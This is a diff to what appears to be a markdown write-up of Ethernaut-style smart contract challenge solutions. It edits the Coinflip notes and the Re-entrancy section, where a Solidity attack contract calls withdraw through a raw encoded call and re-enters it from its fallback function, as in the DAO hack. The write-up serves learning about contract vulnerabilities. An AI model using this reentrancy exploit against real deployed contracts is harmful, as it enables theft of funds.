@@ -17,6 +17,8 @@ await contract.sendAllocation(await contract.owner());
 
 ## 3. Coinflip
 Don't rely on block number for any validation logic. A malicious user can calculate the solution to bypass your validation if both txns in the same block i.e. wrapped in the same function call.
+
+Note: For some reason, I can't seem to call these functions more than once in the same function call i.e. another function that calls one of these malicious functions multiple times in one function call.
 ``` 
 pragma solidity ^0.6.0;
 import "./CoinFlip.sol";
@@ -130,14 +132,11 @@ contract AttackForce {
 ```
 
 ## 10. Re-entrancy
-The same hack as the DAO hack. Due to the ordering of the transactions, the malicious contract is able to keep calling the withdraw function as the internal state is only updated after the transfer is done. When the call.value is processed, the control is handed back to the `fallback` function of the malicious contract which then calls the withdraw function again.
-Note that the number of times the fallback function runs is based on the amt of gas submitted when you call `maliciousWithdraw()`. 
+The same hack as the DAO hack. Due to the ordering of the transactions, the malicious contract is able to keep calling the withdraw function as the internal state is only updated after the transfer is done. When the call.value is processed, the control is handed back to the `fallback` function of the malicious contract which then calls the withdraw function again. Note that the number of times the fallback function runs is based on the amount of gas submitted when you call `maliciousWithdraw()`. 
 
-Also, not sure why calling function via address.call() doesn't work for withdraw but it works for donating...
+Note: You need to use `uint256` instead of `uint` when encoding the signature.
 ```
 pragma solidity ^0.6.0;
-
-import "./Reentrance.sol";
 
 contract AttackReentrancy {
     address payable victim;
@@ -152,7 +151,8 @@ contract AttackReentrancy {
     
     function maliciousWithdraw() public payable {
         // Call withdraw
-        Reentrance(victim).withdraw(0.5 ether);
+        bytes memory payload = abi.encodeWithSignature("withdraw(uint256)", 0.5 ether);
+        victim.call(payload);
     }
     
     fallback() external payable {
